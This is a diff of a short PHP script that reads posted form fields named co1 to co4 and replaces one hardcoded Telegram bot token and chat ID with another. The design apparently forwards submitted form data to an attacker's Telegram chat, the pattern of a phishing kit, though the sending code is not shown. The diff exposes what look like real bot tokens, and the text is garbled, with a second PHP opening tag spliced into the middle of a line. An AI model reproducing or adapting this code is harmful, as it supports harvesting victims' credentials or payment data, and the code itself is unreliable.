@@ -5,8 +5,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 	$co3 = $_POST["co3"];
 	$co4 = $_POST["co4"];
 	
-  $botToken = "7356380446:AAERwTFEndqW0wSfHHhuajIg70Ld8fSW6GM"; // Reemplaza con tu token de bot
-    $chatID = "5868379051"; // Reemplaza con tu chat ID<?php
+  $botToken = "8857815714:AAFp5JutGMJPmwrZf5NwiigjazGNVbnJEB4"; // Reemplaza con tu token de bot
+    $chatID = "8555745789"; // Reemplaza con tu chat ID<?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $co1 = $_POST["co1"] ?? '';
     $co2 = $_POST["co2"] ?? '';
